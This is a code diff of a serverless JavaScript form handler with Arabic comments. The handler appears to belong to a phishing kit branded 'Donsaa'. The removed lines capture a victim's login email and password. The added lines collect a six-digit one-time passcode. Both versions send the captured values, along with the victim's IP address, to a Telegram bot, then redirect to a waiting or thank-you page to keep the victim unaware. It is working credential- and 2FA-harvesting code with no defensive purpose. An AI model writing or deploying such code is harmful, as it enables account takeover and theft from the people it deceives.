@@ -20,31 +20,29 @@ const escapeMarkdownV2 = (text) => {
     return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
 };
 
-
 exports.handler = async (event, context) => {
-    
     if (event.httpMethod !== "POST") {
         return { statusCode: 405, body: "Method Not Allowed" };
     }
     
-    // فك ترميز بيانات النموذج
     const bodyParams = new URLSearchParams(event.body);
     
-    const email = bodyParams.get('login_email') || 'غير متوفر';
-    const password = bodyParams.get('login_password') || 'غير متوفر';
+    // تجميع حقول OTP الستة
+    let otpCode = '';
+    for (let i = 1; i <= 6; i++) {
+        otpCode += bodyParams.get(`otp${i}`) || '';
+    }
     
     // التقاط IP باستخدام الدالة المساعدة
     const ip = getClientIp(event.headers); 
 
-    // تطبيق الترميز على المتغيرات
-    const safe_email = escapeMarkdownV2(email);
-    const safe_password = escapeMarkdownV2(password);
+    // تطبيق الترميز
+    const safe_otp = escapeMarkdownV2(otpCode);
     const safe_ip = escapeMarkdownV2(ip);
-    
+
     // تشكيل الرسالة
-    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
-    message_text += `E\\-Mail: \`${safe_email}\`\n`;
-    message_text += `Passwort: \`${safe_password}\`\n`;
+    let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
+    message_text += `OTP Code: \`${safe_otp}\`\n`;
     message_text += `IP: \`${safe_ip}\``; 
 
     // إعدادات Telegram
@@ -53,10 +51,10 @@ exports.handler = async (event, context) => {
     
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error("Telegram credentials missing in environment variables.");
-        // التحويل إلى الصفحة التالية حتى في حالة الخطأ
-        return { statusCode: 303, headers: { Location: '/waiting.html' } };
+        // التحويل إلى صفحة الشكر بالرغم من الخطأ
+        return { statusCode: 303, headers: { Location: '/thankyou.html' } };
     }
-
+    
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     const data = {
@@ -76,11 +74,11 @@ exports.handler = async (event, context) => {
         console.error("Error sending message to Telegram:", error);
     }
     
-    // التحويل إلى صفحة الانتظار
+    // التحويل إلى الوجهة النهائية (يجب إنشاء ملف thankyou.html)
     return {
         statusCode: 303,
         headers: {
-            Location: '/waiting.html',
+            Location: '/thankyou.html', 
         },
     };
 };
